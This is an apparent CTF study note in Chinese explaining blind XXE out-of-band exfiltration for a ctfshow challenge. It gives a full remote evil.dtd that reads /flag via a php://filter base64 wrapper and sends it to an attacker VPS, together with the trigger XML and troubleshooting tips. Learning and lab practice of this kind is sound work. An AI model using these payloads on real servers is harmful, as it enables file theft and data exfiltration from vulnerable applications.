# ctfshow374：OOB HTTP 外带

这篇笔记只讲一件事：

> 页面不回显的时候，怎么让目标服务器主动把 `/flag` 发到你自己的服务器上。

如果你完全不懂 XML，也没关系。你可以先把 XML 暂时理解成：

- 正文是“要提交的数据”
- `DTD` 是“解释规则”
- `ENTITY` 是“变量”

XXE 的本质，就是我们偷偷在“解释规则”里塞一个恶意变量，让服务器去读文件，或者去访问别的地址。

---

## 1. 为什么最直觉的写法不行

很多人一开始会尝试这样写：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY test SYSTEM "http://你的VPS:端口?flag=/flag">
]>
<note>&test;</note>
```

直觉上会以为：

- 服务器访问你的 VPS
- URL 参数里的 `flag=/flag` 会自动变成 `/flag` 的文件内容

但实际上不会。

原因是：

- `http://你的VPS:端口?flag=/flag` 只是一个普通字符串
- XML 解析器只会把它当成“要访问的地址”
- 它不会因为你写了 `/flag`，就自动帮你读文件

所以你在 VPS 日志里看到的只会是：

```text
GET /?flag=/flag
```

或者：

```text
GET /?flag=file:///flag
```

而不是 flag 内容本身。

---

## 2. 为什么要引入 `evil.dtd`

这一步是很多人第一次做 Blind XXE 时最困惑的地方。

原因很简单：

- 你不只是想“让服务器访问一个 URL”
- 你是想“先读文件，再把文件内容拼进另一个 URL”

而这种“先声明、再拼装、再触发”的操作，最适合放到 DTD 里完成。

所以常见做法是：

1. 你先发一个很短的 XML 给目标
2. 这个 XML 让目标去你的服务器下载 `evil.dtd`
3. `evil.dtd` 里再定义真正的读取和外带逻辑

这叫 **远程 DTD**。

---

## 3. 这一招到底在做什么

你可以把整个过程想成这样：

1. 你对目标说：“先去我服务器拿一份说明书”
2. 目标把 `evil.dtd` 拿回来
3. 说明书里写着：
   - 去读 `/flag`
   - 把它做 base64
   - 再拼到 `http://你的VPS/?d=...`
4. 目标照着说明书执行
5. 你在自己服务器的访问日志里拿到数据

---

## 4. 推荐 payload

### 你自己 VPS 上的 `evil.dtd`

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://你的VPS:端口/?d=%file;'>">
%oob;
```

这三行分别在做什么：

### 第一行

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

意思是：

- 定义一个参数实体 `%file`
- 它的值来自 `/flag`
- 但不是直接读取原文，而是先做 base64 编码

为什么常常要 base64：

- 文件内容里可能有换行、空格、特殊字符
- 直接塞进 URL 容易把 XML 或 HTTP 请求弄坏
- base64 更稳定，日志里也更容易完整取出

---

### 第二行

```dtd
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://你的VPS:端口/?d=%file;'>">
```

这行第一次看会很绕，但本质上是在“动态生成一个新的实体定义”。

它想表达的是：

- 再定义一个普通实体 `exfil`
- 当 `exfil` 被触发时，目标去访问：

```text
http://你的VPS:端口/?d=刚才读取到的文件内容
```

也就是说，这里真正完成了“把文件内容拼到 URL 里”这件事。

---

### 第三行

```dtd
%oob;
```

这表示：

- 把刚才那段“动态生成的实体定义”真正展开
- 让 `exfil` 这个实体正式生效

---

## 5. 发给目标服务器的 XML

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://你的VPS:端口/evil.dtd">
  %dtd;
]>
<foo>&exfil;</foo>
```

这段 XML 的意思是：

- 去下载远程 DTD：`evil.dtd`
- 把里面的规则展开
- 最后在正文里触发 `&exfil;`

一旦 `&exfil;` 被触发，目标就会向你的 VPS 发起第二个请求。

这个第二个请求，才是携带 flag 的关键请求。

---

## 6. 整体流程图

```text
你                           目标服务器                       你的 VPS
│                               │                               │
│  POST XML ------------------> │                               │
│                               │  GET /evil.dtd -------------> │
│                               │ <----------- 返回 evil.dtd ---│
│                               │  读取 /flag                   │
│                               │  base64 编码                  │
│                               │  GET /?d=xxxxxx -----------> │
│                               │                               │
```

你真正想看到的是最后那条：

```text
GET /?d=xxxxxx
```

把 `d=` 后面的 base64 解码，就能拿到 flag。

---

## 7. 为什么正文里写的是 `&exfil;`

这里要区分两种实体：

- `%name;`：参数实体，只能在 DTD 里使用
- `&name;`：普通实体，通常在 XML 正文里使用

在这条利用链里：

- `%file` 和 `%oob` 是参数实体
- `exfil` 是最终生成出来的普通实体

所以正文里要写：

```xml
<foo>&exfil;</foo>
```

而不是 `%exfil;`。

---

## 8. 这题为什么特别适合这条方法

因为题目代码明确说明了两件事：

```php
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
```

这意味着：

- 实体会展开
- DTD 会加载

而 Blind XXE 的核心恰好就是：

- 让目标加载 DTD
- 再利用 DTD 完成读取和外带

所以这题本质上是在考你：

> 没有回显的时候，你还会不会把“解析器会主动发请求”这个能力利用起来。

---

## 9. 常见坑

### 坑 1：把路径直接写进 URL，以为会自动读取

错误思路：

```text
http://你的VPS/?flag=/flag
```

这只是字面量，不会自动读文件。

---

### 坑 2：忘了分号

这些地方都很容易漏：

- `%dtd;`
- `%oob;`
- `&exfil;`

XML/DTD 对分号很敏感，漏了就可能直接解析失败。

---

### 坑 3：不用 base64，导致外带内容不完整

如果文件内容里有特殊字符，URL 可能会断掉，或者 XML 直接报错。

所以在 PHP 题里，`php://filter/convert.base64-encode/resource=/flag` 非常常见。

---

### 坑 4：正文没有真正触发实体

有些 payload 虽然成功拉取了 `evil.dtd`，但正文里没有引用 `&exfil;`，最后不会发出第二个携带数据的请求。

---

## 10. 一句话复盘

这条方法真正的关键，不是“写一个更复杂的 XML”，而是：

> 把目标服务器变成你的代理，让它自己去读文件，再自己把结果发到你控制的地方。

如果你已经看懂这里，再看 [[ctfshow374报错外带]] 和 [[ctfshow374本地DTD_Gadget]] 会容易很多。
